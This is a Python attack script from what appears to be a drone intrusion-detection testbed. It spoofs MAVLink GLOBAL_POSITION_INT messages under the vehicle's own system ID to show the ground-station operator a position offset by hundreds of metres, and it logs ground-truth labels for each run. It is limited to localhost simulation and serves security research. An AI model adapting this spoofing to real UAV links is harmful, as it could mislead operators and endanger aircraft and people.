#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""fake_telemetry.py — SAHTE TELEMETRİ saldırısı (fake_telemetry).

Ne yapar: Aracın GERÇEK konumunu telsiz kanalından dinler, ondan sapmış sahte
GLOBAL_POSITION_INT mesajlarını aracın kendi sysid'iyle yayınlar. Amaç,
operatörü aracın yeri konusunda yanıltmaktır.

Paketler proxy'nin havadan enjeksiyon portuna (14551) yazılır: Yer istasyonuna
ulaşır, uçağa (SITL) iletilmez. Duvar onları telsizden gelirken gördüğü için
gcs2uav olarak kaydedilir (MIMARI.md, telsiz kanalı varsayımı).

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır. Yalnızca simülasyon içindir.

Kullanım:
    python betikler/saldirilar/fake_telemetry.py --ucus F210_fake_telemetry \
        --sure 30 --baslangic-gecikme 50 --sapma-m 500
"""

from __future__ import annotations

import math
import time

import saldiri_temel as st
import ortak

METRE_BASINA_ENLEM = 1 / 111_320.0   # 1 derece enlem ~ 111.320 m
ILK_KONUM_ZAMAN_ASIMI_S = 3.0


def sahte_konum(lat_e7: int, lon_e7: int, sapma_m: float,
                yon_derece: float = 45.0) -> tuple[int, int]:
    """Gerçek konumdan verilen yönde sapma_m uzaklıktaki noktayı döndürür."""
    enlem = lat_e7 / 1e7
    yon = math.radians(yon_derece)
    enlem_farki = sapma_m * math.cos(yon) * METRE_BASINA_ENLEM
    boylam_farki = (sapma_m * math.sin(yon) * METRE_BASINA_ENLEM
                    / math.cos(math.radians(enlem)))
    return lat_e7 + int(enlem_farki * 1e7), lon_e7 + int(boylam_farki * 1e7)


def _son_konumu_al(baglanti, onceki):
    """Bekleyen tüm mesajları okur, en güncel gerçek konumu döndürür."""
    konum = onceki
    while True:
        msg = baglanti.recv_match(type="GLOBAL_POSITION_INT", blocking=False)
        if msg is None:
            return konum
        konum = msg


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument("--hiz", type=float, default=5.0, help="Saniyedeki sahte telemetri sayısı.")
    ap.add_argument("--sapma-m", type=float, default=500.0, help="Gerçek konumdan sapma (metre).")
    args = ap.parse_args()

    cfg = ortak.config_oku()
    # Aracı taklit et: araç sysid'i (genelde 1). Hedef: havadan enjeksiyon portu.
    baglanti = st.gonderen_kur(
        cfg, source_system=1, source_component=1,
        port=int(cfg.get("hava_enjeksiyon_port", 14551)),
    )
    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log(f"Sahte telemetri başlıyor (~{args.sapma_m} m sapma).", "UYARI")
    start_ns = ortak.simdi_ns()

    # İlk paket proxy'ye adresimizi öğretir; kanal dinlemesi bundan sonra başlar.
    baglanti.mav.heartbeat_send(1, 3, 0, 10, 4)
    attacker_addr = st.attacker_addr_al(baglanti, cfg)
    gercek = baglanti.recv_match(
        type="GLOBAL_POSITION_INT", blocking=True, timeout=ILK_KONUM_ZAMAN_ASIMI_S
    )
    if gercek is None:
        ortak.hata_ve_cik("Gerçek konum dinlenemedi; proxy ve uçuş çalışıyor mu?")

    aralik = 1.0 / max(args.hiz, 0.1)
    son = time.time() + args.sure
    gonderilen = 0
    while time.time() < son:
        gercek = _son_konumu_al(baglanti, gercek)
        lat, lon = sahte_konum(gercek.lat, gercek.lon, args.sapma_m)
        baglanti.mav.global_position_int_send(
            gercek.time_boot_ms, lat, lon, gercek.alt, gercek.relative_alt,
            gercek.vx, gercek.vy, gercek.vz, gercek.hdg,
        )
        gonderilen += 1
        time.sleep(aralik)

    end_ns = ortak.simdi_ns()
    ortak.log(f"Saldırı bitti. {gonderilen} sahte telemetri gönderildi.", "BILGI")

    st.ground_truth_yaz(
        args.ucus, "fake_telemetry", start_ns, end_ns, attacker_addr,
        {"sapma_m": args.sapma_m, "hiz": args.hiz, "gonderilen": gonderilen}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
